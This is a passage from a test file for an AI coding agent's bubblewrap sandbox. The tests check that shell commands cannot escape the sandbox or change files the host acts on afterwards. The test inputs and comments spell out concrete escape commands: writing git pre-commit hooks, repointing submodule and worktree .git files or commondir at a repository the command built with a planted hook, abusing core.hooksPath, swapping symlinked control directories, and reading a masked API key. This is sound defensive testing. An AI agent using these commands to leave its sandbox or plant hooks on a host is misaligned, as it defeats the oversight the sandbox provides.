  it('runs commands normally when sandbox is disabled', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings({ enabled: false });
    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('hello');
    expect(result.content).not.toContain('[sandboxed]');
  });

  it('marks output as [sandboxed] when sandbox is enabled and available', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return; // no bwrap on this host

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo hello' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('[sandboxed]');
    expect(result.content).toContain('hello');
  });

  it('still supports shell syntax inside the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    const r = createDefaultRegistry();
    const result = await r.execute(
      { id: 'c1', name: 'Bash', arguments: { command: 'echo one && echo two | tr a-z A-Z' } },
      ctx,
    );
    expect(result.status).toBe('success');
    expect(result.content).toContain('one');
    expect(result.content).toContain('TWO');
  });

  it('refuses a workdir outside the workspace rather than binding it', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // Binding a model-supplied workdir is a complete escape: `--bind / /`
    // emitted after the default mounts shadows all of them.
    const escapeTarget = join(tmpdir(), `book-sandbox-workdir-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `touch ${escapeTarget}`, workdir: '/' },
      },
      ctx,
    );

    try {
      expect(result.status).not.toBe('success');
      expect(result.content + (result.structuredError?.message ?? '')).toMatch(
        /outside the sandboxed workspace/i,
      );
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });

  it('confines writes reached through shell metacharacters to the sandbox', async () => {
    const { createDefaultRegistry } = await import('./tools/registry.js');
    ctx.sandbox = sandboxSettings();
    if (createSandbox(ctx.sandbox) === null) return;

    // The escape this guards against: when the wrapper is joined into one
    // string and spawned with `shell: true`, the host shell splits on `;` and
    // runs the second command outside bwrap entirely.
    const escapeTarget = join(tmpdir(), `book-sandbox-escape-${process.pid}.txt`);
    rmSync(escapeTarget, { force: true });
    const inside = join(dir, 'inside.txt');

    const r = createDefaultRegistry();
    const result = await r.execute(
      {
        id: 'c1',
        name: 'Bash',
        arguments: { command: `echo contained > ${inside}; echo pwned > ${escapeTarget}` },
      },
      ctx,
    );

    try {
      expect(result.status).toBe('success');
      // The workspace bind is real: the in-workspace write reaches the host.
      expect(existsSync(inside)).toBe(true);
      // /tmp is a tmpfs inside the sandbox, so the second write never lands.
      expect(existsSync(escapeTarget)).toBe(false);
    } finally {
      rmSync(escapeTarget, { force: true });
    }
  });
});

/**
 * The argv is only a claim; this is the claim under a real bubblewrap. Every
 * path here is one the host acts on *after* the sandboxed command exits, which
 * is what makes a write to it an escape rather than a nuisance.
 */
describe.skipIf(!sandboxBackendAvailable())(
  'workspace control files are read-only in a real sandbox',
  () => {
    /**
     * A throwaway git repository with the control files already present, since
     * "a hook the host would run" needs a hook to exist.
     */
    function freshRepo(options: { book?: boolean } = {}): string {
      const repo = mkdtempSync(join(tmpdir(), 'book-sandbox-ro-'));
      execFileSync('git', ['init', '--quiet'], { cwd: repo });
      mkdirSync(join(repo, '.git', 'hooks'), { recursive: true });
      writeFileSync(join(repo, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
      writeFileSync(join(repo, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
      if (options.book) {
        mkdirSync(join(repo, '.book'), { recursive: true });
        writeFileSync(join(repo, '.book', 'settings.json'), '{}\n');
      }
      return repo;
    }

    /** A sandbox override as the loader applies one: shallow, per-object. */
    type SandboxOverrides = Partial<Omit<ResolvedSettings['sandbox'], 'filesystem'>> & {
      filesystem?: Partial<ResolvedSettings['sandbox']['filesystem']>;
    };

    async function sandboxedBash(
      command: string,
      workspace: string,
      overrides: SandboxOverrides = {},
    ): Promise<{ status: string; content: string }> {
      const { createDefaultRegistry } = await import('./tools/registry.js');
      const base = sandboxSettings({ allowUnsandboxedCommands: false });
      const result = await createDefaultRegistry().execute(
        { id: 'c1', name: 'Bash', arguments: { command } },
        {
          workspaceRoot: workspace,
          env: {},
          sandbox: {
            ...base,
            ...overrides,
            filesystem: { ...base.filesystem, ...overrides.filesystem },
          },
        },
      );
      return {
        status: result.status,
        content: `${result.content}\n${result.structuredError?.message ?? ''}`,
      };
    }

    it('still writes an ordinary workspace file', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

        expect(result.status).toBe('success');
        expect(readFileSync(join(repo, 'notes.txt'), 'utf8')).toBe('ok');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write .book/settings.local.json where .book exists', async () => {
      const repo = freshRepo({ book: true });
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
        expect(readFileSync(join(repo, '.book', 'settings.json'), 'utf8')).toBe('{}\n');
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to create .book where none exists', async () => {
      const repo = freshRepo();
      try {
        const result = await sandboxedBash(`printf 'pwned' > .book/settings.local.json`, repo);

        expect(result.status).not.toBe('success');
        expect(result.content.toLowerCase()).toMatch(/read-only file system/);
        expect(existsSync(join(repo, '.book', 'settings.local.json'))).toBe(false);
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    it('refuses to write git hooks and .git/config, leaving them unchanged', async () => {
      const repo = freshRepo();
      try {
        for (const target of ['.git/hooks/pre-commit', '.git/config']) {
          const result = await sandboxedBash(`printf 'pwned' > ${target}`, repo);

          expect(result.status, target).not.toBe('success');
          expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
        }
        // The host still holds what it held: the next `git commit` on the host
        // runs the original hook and reads the original config.
        expect(readFileSync(join(repo, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe(
          '#!/bin/sh\nexit 0\n',
        );
        expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).toBe(
          '[core]\n\trepositoryformatversion = 0\n',
        );
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    });

    /**
     * Read-only *children* of a git dir were not enough, because the file that
     * *selects* the git dir stayed writable. Every command below was reproduced
     * against this host: a sandboxed command pointed git at a repository it
     * built, and the host's next `git commit` ran the hook that command had
     * planted. The point of each case is the *host* file afterwards — a write
     * that fails inside the namespace and still changes the file would be no
     * protection at all.
     */
    describe('git pointer files', () => {
      /** A repository with a linked worktree, whose `.git` is a one-line file. */
      function repoWithWorktree(): { main: string; worktree: string; pointer: string } {
        const main = freshRepo();
        const worktree = mkdtempSync(join(tmpdir(), 'book-sandbox-wt-'));
        rmSync(worktree, { recursive: true, force: true });
        execFileSync('git', ['worktree', 'add', '--quiet', worktree, '-b', 'wt'], { cwd: main });
        return { main, worktree, pointer: readFileSync(join(worktree, '.git'), 'utf8') };
      }

      /** A repository with a submodule, whose git dir is `.git/modules/<name>`. */
      function repoWithSubmodule(path = 'sub'): { main: string; source: string; sub: string } {
        const main = freshRepo();
        const source = mkdtempSync(join(tmpdir(), 'book-sandbox-sub-src-'));
        const sub = path;
        execFileSync('git', ['init', '--quiet'], { cwd: source });
        writeFileSync(join(source, 'a.txt'), 'a\n');
        execFileSync('git', ['add', 'a.txt'], { cwd: source });
        execFileSync(
          'git',
          [
            '-c',
            'user.email=book@example.invalid',
            '-c',
            'user.name=book',
            'commit',
            '--quiet',
            '-m',
            'init',
          ],
          { cwd: source },
        );
        mkdirSync(join(main, path.split('/').slice(0, -1).join('/')), { recursive: true });
        execFileSync(
          'git',
          [
            '-c',
            'protocol.file.allow=always',
            '-c',
            'user.email=book@example.invalid',
            '-c',
            'user.name=book',
            'submodule',
            'add',
            '--quiet',
            source,
            sub,
          ],
          { cwd: main },
        );
        return { main, source, sub };
      }

      /**
       * The submodule half of the escape, reproduced against this host: only the
       * workspace *root* `.git` was read-only, so a sandboxed command repointed
       * `sub/.git` at a repository it had built and the host's next
       * `git -C sub commit` ran the hook planted there.
       */
      it('refuses to repoint a submodule .git file at a repository the command built', async () => {
        const { main, source, sub } = repoWithSubmodule();
        try {
          const pointer = join(main, sub, '.git');
          const before = readFileSync(pointer, 'utf8');

          const result = await sandboxedBash(
            `git init --quiet evil && printf '#!/bin/sh\\ntouch pwned\\n' > evil/hooks/pre-commit && ` +
              `chmod +x evil/hooks/pre-commit && printf 'gitdir: ../evil\\n' > ${sub}/.git`,
            main,
          );

          expect(result.status).not.toBe('success');
          // The scratch repo is fine — the workspace is writable. The pointer the
          // host reads is what matters.
          expect(readFileSync(pointer, 'utf8')).toBe(before);
          // And the host's own git still runs this submodule's own hook, not one
          // the command wrote.
          execFileSync(
            'git',
            [
              '-c',
              'user.email=book@example.invalid',
              '-c',
              'user.name=book',
              'commit',
              '--quiet',
              '--allow-empty',
              '-m',
              'host commit',
            ],
            { cwd: join(main, sub) },
          );
          expect(existsSync(join(main, sub, 'pwned'))).toBe(false);
          expect(existsSync(join(main, 'pwned'))).toBe(false);
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(source, { recursive: true, force: true });
        }
      });

      it('refuses to write a multi-segment submodule git dir hooks or config', async () => {
        // `git submodule add url libs/deep` puts the git dir at
        // `.git/modules/libs/deep`, where `libs` is only a container directory.
        const { main, source, sub } = repoWithSubmodule('libs/deep');
        try {
          const config = join(main, '.git', 'modules', 'libs', 'deep', 'config');
          const configBefore = readFileSync(config, 'utf8');

          for (const target of [
            `.git/modules/libs/deep/hooks/pre-commit`,
            `.git/modules/libs/deep/config`,
          ]) {
            const result = await sandboxedBash(`printf 'pwned' > ${target}`, main);

            expect(result.status, target).not.toBe('success');
            expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
          }

          expect(readFileSync(config, 'utf8')).toBe(configBefore);
          expect(readFileSync(join(main, sub, '.git'), 'utf8')).toContain('.git/modules/libs/deep');
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(source, { recursive: true, force: true });
        }
      });

      it('refuses to repoint a worktree .git file at a repository the command built', async () => {
        const { main, worktree, pointer } = repoWithWorktree();
        try {
          // The whole escape in one line: build a bare repo with a hook, then
          // make this worktree's git point at it. Before the fix the host's
          // `git commit` in `worktree` ran the hook this command wrote.
          const result = await sandboxedBash(
            `git init --quiet --bare evil && printf '#!/bin/sh\\ntouch pwned\\n' > evil/hooks/pre-commit && chmod +x evil/hooks/pre-commit && printf 'gitdir: evil\\n' > .git`,
            worktree,
          );

          expect(result.status).not.toBe('success');
          // The scratch repo is fine — the workspace is writable. The pointer
          // the host reads is what matters, and it is untouched, so the host's
          // git still resolves to this worktree's own git dir and not to `evil`.
          expect(readFileSync(join(worktree, '.git'), 'utf8')).toBe(pointer);
          expect(
            execFileSync('git', ['-C', worktree, 'rev-parse', '--absolute-git-dir'], {
              encoding: 'utf8',
            }).trim(),
          ).toContain('worktrees');
          // And nothing the command planted has run.
          expect(existsSync(join(worktree, 'pwned'))).toBe(false);
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(worktree, { recursive: true, force: true });
        }
      });

      it('refuses to rewrite the commondir a linked worktree resolves through', async () => {
        const { main, worktree } = repoWithWorktree();
        const pointer = join(main, '.git', 'worktrees', basename(worktree), 'commondir');
        try {
          const before = readFileSync(pointer, 'utf8');
          const result = await sandboxedBash(
            `mkdir -p evil/hooks && printf '#!/bin/sh\\ntouch pwned\\n' > evil/hooks/pre-commit && printf '../evil\\n' > .git/worktrees/${basename(worktree)}/commondir`,
            main,
          );

          expect(result.status).not.toBe('success');
          expect(readFileSync(pointer, 'utf8')).toBe(before);
          expect(existsSync(join(main, 'pwned'))).toBe(false);
          // The worktree still resolves to a git dir that exists.
          expect(
            execFileSync('git', ['-C', worktree, 'rev-parse', '--git-dir'], {
              encoding: 'utf8',
            }).trim(),
          ).toContain('worktrees');
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(worktree, { recursive: true, force: true });
        }
      });

      it('refuses to write a submodule git dir hooks or config', async () => {
        const { main, source, sub } = repoWithSubmodule();
        try {
          const hook = join(main, '.git', 'modules', sub, 'hooks', 'pre-commit');
          const config = join(main, '.git', 'modules', sub, 'config');
          const hookBefore = existsSync(hook) ? readFileSync(hook, 'utf8') : null;
          const configBefore = readFileSync(config, 'utf8');

          for (const target of [
            `.git/modules/${sub}/hooks/pre-commit`,
            `.git/modules/${sub}/config`,
          ]) {
            const result = await sandboxedBash(`printf 'pwned' > ${target}`, main);
            expect(result.status, target).not.toBe('success');
            expect(result.content.toLowerCase(), target).toMatch(/read-only file system/);
          }

          expect(existsSync(hook) ? readFileSync(hook, 'utf8') : null).toBe(hookBefore);
          expect(readFileSync(config, 'utf8')).toBe(configBefore);
        } finally {
          rmSync(main, { recursive: true, force: true });
          rmSync(source, { recursive: true, force: true });
        }
      });

      it('refuses to rename the git directory away, which a child mount does not stop', async () => {
        // rename(2) on a path that is not a mount point succeeds, so read-only
        // `hooks/` and `config` inside a writable `.git` are not protection: the
        // whole directory moves out and a fresh writable one takes its place.
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(`mv .git .git.old && git init --quiet .git.old`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/busy|read-only/);
          // The git dir is still the one the host had, hooks and all.
          expect(existsSync(join(repo, '.git', 'hooks', 'pre-commit'))).toBe(true);
          expect(existsSync(join(repo, '.git.old'))).toBe(false);
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).toBe(
            '[core]\n\trepositoryformatversion = 0\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to write the hooks directory core.hooksPath names', async () => {
        // husky v9 does exactly this: `core.hooksPath = .husky/_`. Protecting
        // `hooks/` while leaving the directory git would actually run from
        // writable protects a directory git never looks at.
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.husky'), { recursive: true });
          writeFileSync(join(repo, '.husky', 'pre-commit'), '#!/bin/sh\nexit 0\n');
          execFileSync('git', ['config', 'core.hooksPath', '.husky'], { cwd: repo });

          const result = await sandboxedBash(`printf 'pwned' > .husky/pre-commit`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/read-only file system/);
          expect(readFileSync(join(repo, '.husky', 'pre-commit'), 'utf8')).toBe(
            '#!/bin/sh\nexit 0\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to create the hooks directory core.hooksPath names', async () => {
        const repo = freshRepo();
        try {
          execFileSync('git', ['config', 'core.hooksPath', '.husky/_'], { cwd: repo });

          const result = await sandboxedBash(
            `mkdir -p .husky/_ && printf '#!/bin/sh\\ntouch pwned\\n' > .husky/_/pre-commit`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(existsSync(join(repo, '.husky', '_', 'pre-commit'))).toBe(false);
          expect(existsSync(join(repo, 'pwned'))).toBe(false);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('explains the read-only git directory when git cannot write it in default mode', async () => {
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(
            `git remote add origin https://example.test/repo.git`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(result.content).toContain(
            "the repository's git directory is read-only inside the sandbox",
          );
          // Said once, not once per stream the text appears in.
          expect(result.content.match(/read-only inside the sandbox/g)).toHaveLength(1);
          // And the repository did not gain the remote, on the host.
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).not.toContain('example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('appends read-only git dir note when git hash-object -w fails', async () => {
        const repo = freshRepo();
        try {
          writeFileSync(join(repo, 'a.txt'), 'hello\n');
          const result = await sandboxedBash('git hash-object -w a.txt', repo);
          expect(result.status).not.toBe('success');
          expect(result.content).toContain('read-only inside the sandbox');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('explains the read-only config when git cannot write it and allowGitWrites is true', async () => {
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(
            `git remote add origin https://example.test/repo.git`,
            repo,
            { filesystem: { allowGitWrites: true } },
          );

          expect(result.status).not.toBe('success');
          expect(result.content).toMatch(/could not write config file|could not lock config file/);
          expect(result.content).toContain('.git/config is read-only inside the sandbox');
          expect(result.content.match(/read-only inside the sandbox/g)).toHaveLength(1);
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).not.toContain('example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to create .git/commondir inside the sandbox', async () => {
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(`printf '../evil\\n' > .git/commondir`, repo);
          expect(result.status).not.toBe('success');
          expect(existsSync(join(repo, '.git', 'commondir'))).toBe(false);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to create .git/commondir when workspace is reached through a symlink', async () => {
        const realRepo = freshRepo();
        const linkRepo = join(tmpdir(), `book-sandbox-link-${Date.now()}`);
        symlinkSync(realRepo, linkRepo);
        try {
          const result = await sandboxedBash(`printf 'x\\n' > .git/commondir`, linkRepo);
          expect(result.status).not.toBe('success');
          expect(existsSync(join(realRepo, '.git', 'commondir'))).toBe(false);
        } finally {
          rmSync(linkRepo, { recursive: true, force: true });
          rmSync(realRepo, { recursive: true, force: true });
        }
      });

      it('refuses a sandboxed commit in default mode, leaving HEAD unchanged and explaining the read-only git directory', async () => {
        const repo = freshRepo();
        try {
          writeFileSync(join(repo, 'initial.txt'), 'one\n');
          execFileSync('git', ['add', 'initial.txt'], { cwd: repo });
          execFileSync(
            'git',
            [
              '-c',
              'user.email=book@example.invalid',
              '-c',
              'user.name=book',
              'commit',
              '--quiet',
              '-m',
              'initial',
            ],
            { cwd: repo },
          );
          const headBefore = execFileSync('git', ['rev-parse', 'HEAD'], {
            cwd: repo,
            encoding: 'utf8',
          }).trim();

          const result = await sandboxedBash(
            `printf 'hello\\n' > a.txt && git add a.txt && git -c user.email=book@example.invalid -c user.name=book commit -m 'inside the sandbox'`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(result.content).toContain(
            "the repository's git directory is read-only inside the sandbox",
          );
          expect(
            execFileSync('git', ['rev-parse', 'HEAD'], { cwd: repo, encoding: 'utf8' }).trim(),
          ).toBe(headBefore);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('allows read-only git commands in the sandbox', async () => {
        const repo = freshRepo();
        try {
          writeFileSync(join(repo, 'initial.txt'), 'one\n');
          execFileSync('git', ['add', 'initial.txt'], { cwd: repo });
          execFileSync(
            'git',
            [
              '-c',
              'user.email=book@example.invalid',
              '-c',
              'user.name=book',
              'commit',
              '--quiet',
              '-m',
              'initial',
            ],
            { cwd: repo },
          );
          writeFileSync(join(repo, 'initial.txt'), 'modified\n');

          for (const cmd of ['git status', 'git diff', 'git log -1', 'git show HEAD']) {
            const result = await sandboxedBash(cmd, repo);
            expect(result.status, cmd).toBe('success');
          }
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('still commits inside the sandbox when allowGitWrites is true, and hooks and config stay read-only', async () => {
        const repo = freshRepo();
        try {
          const result = await sandboxedBash(
            `printf 'hello\\n' > a.txt && git add a.txt && git -c user.email=book@example.invalid -c user.name=book commit --quiet -m 'inside the sandbox'`,
            repo,
            { filesystem: { allowGitWrites: true } },
          );

          expect(result.status).toBe('success');
          expect(
            execFileSync('git', ['log', '--oneline'], { cwd: repo, encoding: 'utf8' }),
          ).toContain('inside the sandbox');

          for (const target of ['.git/hooks/pre-commit', '.git/config']) {
            const writeResult = await sandboxedBash(`printf 'pwned' > ${target}`, repo, {
              filesystem: { allowGitWrites: true },
            });
            expect(writeResult.status, target).not.toBe('success');
            expect(writeResult.content.toLowerCase(), target).toMatch(/read-only file system/);
          }
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('explains the read-only git directory in background output too', async () => {
        const repo = freshRepo();
        const { createDefaultRegistry } = await import('./tools/registry.js');
        const base = sandboxSettings({ allowUnsandboxedCommands: false });
        const ctx = {
          workspaceRoot: repo,
          env: {},
          sandbox: base,
        };
        try {
          const registry = createDefaultRegistry();
          const started = await registry.execute(
            {
              id: 'bg',
              name: 'Bash',
              arguments: {
                command: `git remote add origin https://example.test/repo.git`,
                run_in_background: true,
              },
            },
            ctx,
          );
          const shellId = /shell_\d+/.exec(started.content)?.[0];
          expect(shellId).toBeDefined();

          let content = '';
          for (let attempt = 0; attempt < 100; attempt += 1) {
            const read = await registry.execute(
              { id: 'bg-out', name: 'BashOutput', arguments: { shell_id: shellId } },
              ctx,
            );
            content = `${read.content}`;
            if (content.includes('read-only inside the sandbox')) break;
            await new Promise((resolve) => setTimeout(resolve, 25));
          }

          expect(content).toContain(
            "the repository's git directory is read-only inside the sandbox",
          );
          expect(content.match(/read-only inside the sandbox/g)).toHaveLength(1);
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).not.toContain('example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('explains the read-only config in background output when allowGitWrites is true', async () => {
        const repo = freshRepo();
        const { createDefaultRegistry } = await import('./tools/registry.js');
        const base = sandboxSettings({
          allowUnsandboxedCommands: false,
          filesystem: { allowGitWrites: true },
        });
        const ctx = {
          workspaceRoot: repo,
          env: {},
          sandbox: base,
        };
        try {
          const registry = createDefaultRegistry();
          const started = await registry.execute(
            {
              id: 'bg-optout',
              name: 'Bash',
              arguments: {
                command: `git remote add origin https://example.test/repo.git`,
                run_in_background: true,
              },
            },
            ctx,
          );
          const shellId = /shell_\d+/.exec(started.content)?.[0];
          expect(shellId).toBeDefined();

          let content = '';
          for (let attempt = 0; attempt < 100; attempt += 1) {
            const read = await registry.execute(
              { id: 'bg-optout-out', name: 'BashOutput', arguments: { shell_id: shellId } },
              ctx,
            );
            content = `${read.content}`;
            if (/could not (?:write|lock) config file/.test(content)) break;
            await new Promise((resolve) => setTimeout(resolve, 25));
          }

          expect(content).toMatch(/could not write config file|could not lock config file/);
          expect(content).toContain('.git/config is read-only inside the sandbox');
          expect(content.match(/read-only inside the sandbox/g)).toHaveLength(1);
          expect(readFileSync(join(repo, '.git', 'config'), 'utf8')).not.toContain('example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('says nothing in background output for git config --global', async () => {
        // `~/.gitconfig` is a different file, and the namespace only binds it
        // read-only if the user listed it in `denyWrite`. Pointing the note at
        // `.git/config` for it sends the model after the wrong file.
        const repo = freshRepo();
        const { createDefaultRegistry } = await import('./tools/registry.js');
        const base = sandboxSettings({ allowUnsandboxedCommands: false });
        const ctx = { workspaceRoot: repo, env: {}, sandbox: base };
        try {
          const registry = createDefaultRegistry();
          const started = await registry.execute(
            {
              id: 'bg-global',
              name: 'Bash',
              arguments: {
                command: `git config --global --add safe.directory '*' 2>&1; echo done`,
                run_in_background: true,
              },
            },
            ctx,
          );
          const shellId = /shell_\d+/.exec(started.content)?.[0];
          let content = '';
          for (let attempt = 0; attempt < 100; attempt += 1) {
            const read = await registry.execute(
              { id: 'bg-global-out', name: 'BashOutput', arguments: { shell_id: shellId } },
              ctx,
            );
            content = read.content;
            if (content.includes('done')) break;
            await new Promise((resolve) => setTimeout(resolve, 25));
          }

          // Non-vacuous: the sandboxed `git config --global` really did fail on
          // the read-only `~/.gitconfig`, and only the *note* is withheld.
          expect(content).toMatch(/could not write config file|could not lock config file/);
          expect(content).not.toContain('read-only inside the sandbox');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });

    describe('control files a workspace can ship in another shape', () => {
      it('hides an existing settings.local.json from the command', async () => {
        // The namespace shares the host network, so a credential the user put
        // in the local layer is one `cat` away from a sandboxed command unless
        // the file's *contents* are masked, not just its mode.
        const repo = freshRepo({ book: true });
        const local = join(repo, '.book', 'settings.local.json');
        writeFileSync(local, JSON.stringify({ provider: { apiKey: 'sk-secret' } }));
        try {
          // The masked path is /dev/null, so the read fails closed rather than
          // returning an empty file: either way the key is not there.
          const result = await sandboxedBash(`cat .book/settings.local.json || true`, repo);

          expect(result.status).toBe('success');
          expect(result.content).not.toContain('sk-secret');
          // The host still has it: this is a mask inside the namespace.
          expect(readFileSync(local, 'utf8')).toContain('sk-secret');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses to write .bookrc.json, which the host reads on the next launch', async () => {
        const repo = freshRepo();
        const rc = join(repo, '.bookrc.json');
        writeFileSync(rc, JSON.stringify({ baseUrl: 'https://api.example.test' }));
        try {
          const result = await sandboxedBash(`printf '{}' > .bookrc.json`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/read-only file system/);
          expect(readFileSync(rc, 'utf8')).toContain('api.example.test');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses cleanly, with no bwrap abort, when .book is a symlink a repository shipped', async () => {
        // `--tmpfs` on a link cannot mkdir, and a link to a directory is "Can't
        // bind mount": either shape aborted the whole bwrap invocation, so a
        // clone could break every sandboxed command in the workspace.
        for (const target of ['.book-real', 'nowhere']) {
          const repo = freshRepo();
          try {
            mkdirSync(join(repo, '.book-real'));
            symlinkSync(target, join(repo, '.book'));
            const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

            expect(result.status, target).not.toBe('success');
            expect(result.content, target).toContain(join(repo, '.book'));
            expect(result.content, target).toMatch(/cannot protect a symlinked control path/);
            // Refused before anything ran: the command is not a partial write.
            expect(existsSync(join(repo, 'notes.txt'))).toBe(false);
          } finally {
            rmSync(repo, { recursive: true, force: true });
          }
        }
      });

      /**
       * Protecting the link's target is not protection: the link itself sits in
       * the writable workspace, so `rm .book && mkdir .book && …` replaces it.
       * Reproduced here — the file the host then reads is one the command wrote.
       */
      it('refuses the run rather than protect a symlinked control path', async () => {
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.book-real'));
          writeFileSync(join(repo, '.book-real', 'settings.json'), '{}\n');
          symlinkSync('.book-real', join(repo, '.book'));

          const result = await sandboxedBash(
            `rm .book && mkdir .book && printf 'pwned' > .book/settings.json`,
            repo,
          );

          expect(result.status).not.toBe('success');
          expect(result.content).toContain(join(repo, '.book'));
          expect(result.content).toMatch(/cannot protect a symlinked control path/);
          expect(readFileSync(join(repo, '.book-real', 'settings.json'), 'utf8')).toBe('{}\n');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      /**
       * `core.hooksPath` set in a file the repo config `[include]`s is still the
       * hooks directory git runs from — `git rev-parse --git-path hooks` reports
       * it — and neither the included file nor the directory it named was
       * protected.
       */
      it('refuses to write the hooks directory an included config names', async () => {
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.git', 'conf.d'), { recursive: true });
          mkdirSync(join(repo, '.husky'), { recursive: true });
          writeFileSync(join(repo, '.husky', 'pre-commit'), '#!/bin/sh\nexit 0\n');
          // Include paths are relative to the including file, which is the git dir.
          writeFileSync(
            join(repo, '.git', 'config'),
            '[core]\n\trepositoryformatversion = 0\n[include]\n\tpath = conf.d/hooks\n',
          );
          writeFileSync(join(repo, '.git', 'conf.d', 'hooks'), '[core]\n\thooksPath = .husky\n');

          const result = await sandboxedBash(`printf 'pwned' > .husky/pre-commit`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content.toLowerCase()).toMatch(/read-only file system/);
          expect(readFileSync(join(repo, '.husky', 'pre-commit'), 'utf8')).toBe(
            '#!/bin/sh\nexit 0\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      /** A config past the read cap is a config whose `hooksPath` is unknown. */
      it('refuses the run when a git config is past the read cap', async () => {
        const repo = freshRepo();
        try {
          writeFileSync(
            join(repo, '.git', 'config'),
            `[core]\n${'# pad\n'.repeat(300_000)}\thooksPath = .husky\n`,
          );

          const result = await sandboxedBash(`printf 'ok' > notes.txt`, repo);

          expect(result.status).not.toBe('success');
          expect(result.content).toContain(join(repo, '.git', 'config'));
          expect(result.content).toMatch(/1 MiB/);
          expect(existsSync(join(repo, 'notes.txt'))).toBe(false);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('leaves the target of a symlinked .book unchanged, because the run is refused', async () => {
        const repo = freshRepo();
        try {
          mkdirSync(join(repo, '.book-real'));
          writeFileSync(join(repo, '.book-real', 'settings.json'), '{}\n');
          symlinkSync('.book-real', join(repo, '.book'));

          const result = await sandboxedBash(`printf 'pwned' > .book-real/settings.json`, repo);

          expect(result.status).not.toBe('success');
          expect(readFileSync(join(repo, '.book-real', 'settings.json'), 'utf8')).toBe('{}\n');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('refuses command when git dir is reached through a workspace symlink (gd shape) leaving host unchanged', async () => {
        const repo = mkdtempSync(join(tmpdir(), 'book-sandbox-gd-'));
        try {
          execFileSync('git', ['init', '--quiet'], { cwd: repo });
          const gitReal = join(repo, '.git-real');
          renameSync(join(repo, '.git'), gitReal);
          symlinkSync('.git-real', join(repo, 'gd'));
          writeFileSync(join(repo, '.git'), 'gitdir: gd\n');

